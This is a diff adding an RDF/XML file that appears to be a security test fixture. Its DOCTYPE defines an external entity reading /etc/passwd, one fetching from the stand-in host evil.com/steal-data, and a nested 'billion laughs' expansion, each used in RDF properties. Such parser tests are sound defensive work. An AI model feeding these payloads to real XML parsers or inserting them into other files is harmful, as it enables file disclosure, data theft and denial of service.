@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rdf:RDF [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe2 SYSTEM "http://evil.com/steal-data">
+  <!ENTITY billion "lol">
+  <!ENTITY billion2 "&billion;&billion;&billion;&billion;&billion;&billion;&billion;&billion;&billion;&billion;">
+  <!ENTITY billion3 "&billion2;&billion2;&billion2;&billion2;&billion2;&billion2;&billion2;&billion2;">
+]>
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:ex="http://example.org/">
+  <rdf:Description rdf:about="http://example.org/resource">
+    <ex:sensitiveData>&xxe;</ex:sensitiveData>
+    <ex:externalData>&xxe2;</ex:externalData>
+    <ex:billionLaughs>&billion3;</ex:billionLaughs>
+  </rdf:Description>
+</rdf:RDF>
